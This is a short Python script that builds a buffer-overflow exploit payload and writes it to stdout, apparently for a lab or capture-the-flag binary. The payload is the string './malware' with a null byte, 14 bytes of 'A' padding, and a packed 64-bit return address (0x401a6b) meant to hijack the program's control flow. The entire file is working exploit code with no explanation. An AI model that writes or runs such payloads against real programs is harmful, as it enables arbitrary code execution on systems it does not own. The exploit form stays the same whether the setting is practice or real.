import sys
import struct

payload = b'./malware\x00' 
payload += b'A' * 14        
payload += struct.pack('<Q', 0x401a6b)

sys.stdout.buffer.write(payload)